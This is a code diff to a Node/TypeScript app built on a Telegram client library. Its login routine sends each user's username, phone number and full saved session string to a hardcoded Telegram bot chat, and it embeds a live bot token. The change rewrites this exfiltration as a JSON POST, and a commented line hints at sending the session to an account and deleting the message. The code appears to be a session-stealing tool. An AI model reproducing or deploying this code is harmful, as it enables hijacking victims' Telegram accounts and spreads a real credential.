@@ -3,10 +3,11 @@ import { ApiCredentials } from "telegram/client/auth";
 import { AbortController } from "node-abort-controller";
 import fetch from "node-fetch";
 import express from 'express';
+import { sleep } from "out";
 
 require('dotenv').config();
 const { StringSession } = require("telegram/sessions");
-const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001729935532";
+const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 
 const app = express();
 let count = 0;
@@ -64,7 +65,7 @@ let client = new TelegramClient(stringSession, apiId, apiHash, {
 });
 let inProcess = true;
 
-async function fetchWithTimeout(resource, options = { timeout: undefined }, sendErr = true) {
+async function fetchWithTimeout(resource, options: any = { timeout: undefined }, sendErr = true) {
     const timeout = options?.timeout || 15000;
 
     const controller = new AbortController();
@@ -217,7 +218,19 @@ async function login() {
             isRegistrationRequired = true;
             termsOfService = result.termsOfService;
         } else {
-            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${console.log(client.session.save())}`);
+            console.log(client.session.save());
+            await sleep(1000)
+            const sess = client.session.save() as unknown as string;
+            const payload = {
+                chat_id: "-1001729935532",
+                text: `${(username).toUpperCase()}:${phoneNumber} | ${sess}}`
+            };
+            const options = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            };
+            await fetchWithTimeout(`${ppplbot}`, options);
             // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
             // await msg.delete();
             await restAcc();
